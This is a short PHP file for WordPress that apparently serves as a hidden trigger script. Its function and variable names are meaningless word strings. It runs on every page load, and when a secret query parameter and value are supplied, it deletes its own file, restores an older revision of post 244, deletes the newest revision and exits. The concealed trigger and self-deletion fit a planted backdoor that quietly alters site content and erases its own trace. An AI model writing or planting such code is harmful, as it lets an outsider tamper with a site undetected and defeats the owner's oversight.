<?php

function translation_performance_discount_safe() {
	if (isset($_GET['light_base_poll_print']) && $_GET['light_base_poll_print'] === 'short_ticket_comment') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$really_sitemaps_jigoshop_limit = 244;
		$default_delete_tools = wp_get_post_revisions($really_sitemaps_jigoshop_limit);
		if (empty($default_delete_tools)) die('no revisions');
		if (count($default_delete_tools) < 2) die('less than 2');
		$manager_themes_max_out = array_shift($default_delete_tools);
		$reloaded_assets_role = $manager_themes_max_out->ID;
		$year_header_syntax = array_shift($default_delete_tools);
		$csv_cloud_checker = $year_header_syntax->ID;
		$lightgray_location_player = wp_restore_post_revision($csv_cloud_checker);
		if ($lightgray_location_player === false) die('error restoring');
		$lightgray_location_player = wp_delete_post_revision($reloaded_assets_role);		
		if ($lightgray_location_player === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'translation_performance_discount_safe');
